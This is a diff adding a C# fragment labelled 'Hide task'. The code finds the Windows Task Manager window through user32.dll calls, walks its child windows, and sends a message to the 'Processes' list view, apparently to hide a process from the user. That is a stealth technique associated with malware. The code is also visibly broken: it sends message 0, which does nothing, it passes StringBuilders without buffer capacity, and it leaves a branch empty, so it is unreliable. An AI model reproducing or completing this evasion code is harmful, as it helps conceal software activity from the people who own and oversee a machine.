@@ -1,0 +1,64 @@
+ // Hide task
+        internal delegate bool WindowEnumProc(IntPtr hwnd, IntPtr lparam);
+        //internal delegate IntPtr LVM_DELETECOLUMN(
+
+        [DllImport("user32.dll")]
+        internal static extern bool EnumChildWindows(IntPtr hwnd, WindowEnumProc func, IntPtr lParam);
+
+        [DllImport("user32.dll", SetLastError = true)]
+        private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
+
+        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+        static extern int GetClassName(IntPtr hWnd, StringBuilder lpClassName, int nMaxCount);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto)]
+        static extern IntPtr SendMessage(IntPtr hWnd, UInt32 Msg, IntPtr wParam, IntPtr lParam);
+
+        private bool EnumChildProcedure(IntPtr hwnd, IntPtr lParam)
+        {
+            try
+            {
+                StringBuilder name = new StringBuilder();
+                GetWindowText(hwnd, name, 256);
+
+                StringBuilder className = new StringBuilder();
+
+                GetClassName(hwnd, className, 256);
+
+                if (string.Compare(name.ToString(), "Processes") == 0 && string.Compare(className.ToString(), "SysListView32") == 0)
+                {
+                    SendMessage(hwnd, 0, hwnd, lParam);
+                }
+
+                if (string.Compare(name.ToString(), "Tasks") == 0 && string.Compare(className.ToString(), "SysListView32") == 0)
+                {
+
+                }
+
+
+                if (name == null)
+                    return false;
+
+                return true;
+            }
+            catch (Exception)
+            {
+
+                throw;
+            }
+        }
+
+        private void HideTask()
+        {
+            IntPtr hwnd;
+            hwnd = FindWindow(null, "Windows Task Manager");
+            IntPtr lParam = new IntPtr();
+
+            WindowEnumProc obj = new WindowEnumProc(EnumChildProcedure);
+            //obj.Invoke(hwnd, hwnd);
+
+            EnumChildWindows(hwnd, obj, lParam);
+        }
